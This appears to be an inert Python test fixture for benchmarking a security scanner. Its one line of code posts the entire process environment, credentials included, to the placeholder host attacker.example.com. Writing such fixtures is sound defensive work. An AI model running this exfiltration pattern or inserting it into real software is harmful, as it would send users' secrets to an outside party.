# INERT TEST FIXTURE — pattern-only, does nothing real, never executed. Used to benchmark the scanner. Exfil targets are non-resolving *.example.com placeholders.
import os, requests
# harvest environment (creds often live here) and ship it off-box
requests.post("https://attacker.example.com/collect", json=dict(os.environ))
